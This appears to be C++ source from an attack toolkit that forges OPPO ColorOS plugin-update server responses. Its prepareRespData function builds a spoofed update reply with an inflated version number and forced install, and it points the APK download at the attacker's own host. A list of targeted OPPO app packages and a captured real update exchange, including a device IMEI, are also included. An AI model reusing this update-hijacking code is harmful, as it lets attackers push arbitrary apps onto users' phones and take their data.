

#include "oppoPluginUpdate.h"

#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"
#include <iostream>
#include <string>

using namespace std;

//com.android.calculator2
//com.oppo.music
//com.coloros.lives
//com.oppo.instant.local.service
//com.coloros.weather
//com.nearme.atlas
//com.nearme.gamecenter
//com.nearme.statistics
//com.sohu.inputmethod.sogouoem
//com.nearme.themespace
//com.coloros.yoli
//com.oppo.market
//com.coloros.backuprestore.remoteservice
//com.oppo.usercenter
//com.coloros.alarmclock
//com.ibimuyu.lockscreen.oppo.v2
//com.oppo.quicksearchbox
//com.oppo.reader
//com.daemon.shelper
//com.coloros.backuprestore
//


//warning LNK4042: 对象被多次指定；已忽略多余的指定
//data\data\com.nearme.note\databases\nearme_note.db,用sqlite的软件打开

int OppoPluginUpdate::prepareRespData(unsigned long  ulIP, string filepath, string filename) {

	int version = 99900;
	string strver = "9.9.9";

	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json;charset=GBK\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	char * jsonFormat =
		"{\"type\":\"1\",\"newVerCode\":%u,\"isDisplayCancel\":-1,\"newVerName\":\"%s\","
		"\"intro\":\"OPPO plugin update\","
		"\"md5\":\"%s\",\"size\":\"%u\","
		"\"url\":\"http://%s/%s\",\"name\":\"%s\",\"forceInstall\":1,\"canUseOld\":1,\"forceDownload\":1,\"sauType\":2,\"iconExists\":4,"
		"\"cfgMd5\":\"72e6f6e0f08ca88f02b1480464afd55b\",\"md5All\":\"%s\",\"sizeAll\":%u,\"msg\":\"SUCCEED\",\"resultCode\":1}";		

	int ret = FALSE;

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpJson[MAX_RESPONSE_HEADER_SIZE];
	int iJsonLen = sprintf_s(lpJson, MAX_RESPONSE_HEADER_SIZE, jsonFormat,
		version,strver.c_str(), m_szmd5,m_filesize,szip.c_str(), filename.c_str(), filename.c_str(), m_szmd5,m_filesize);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iJsonLen, lpJson);

	return m_filesize;
}


/*
POST /post/Query_Update HTTP/1.1
Content-Length: 193
Content-Type: application/json; charset=UTF-8
Host: i.sau.coloros.com
Connection: Keep-Alive
User-Agent: ; Release-6 3gpp-gba

{"imei":"864257034824830","mobile":"A57","colorOSVer":"ColorOS3.0","androidVer":"Android6.0.1",
"verCode":0,"pkgName":"com.nearme.note","mode":0,"type":1,"language":"zh-CN","time":1552142560119}HTTP/1.1 200 OK
Server: nginx
Date: Sat, 09 Mar 2019 14:42:39 GMT
Content-Type: application/json;charset=UTF-8
Content-Length: 651
Connection: keep-alive
X-Server-ID: bj0690

{"type":"1","newVerCode":5010,"isDisplayCancel":-1,"newVerName":"5.0.10",
"intro":"1、 解决本地便签删除后再从云端恢复，有一条未正常显示的问题 <br />2、 提升版本稳定性",
"md5":"5a613c1492c4ef0fcf35093768a89500","size":"4263655",
"url":"http://saufs.coloros.com/patch/CHN/com.nearme.note/5010_1541503272624/com.nearme.note_all_1811061906_ae5d3b248.apk",
"name":"com.nearme.note_all_1811061906_ae5d3b248.apk","forceInstall":0,"canUseOld":1,"forceDownload":1,"sauType":2,
"iconExists":4,"cfgMd5":"72e6f6e0f08ca88f02b1480464afd55b","md5All":"5a613c1492c4ef0fcf35093768a89500","sizeAll":4263655,
"msg":"SUCCEED","resultCode":1}
*/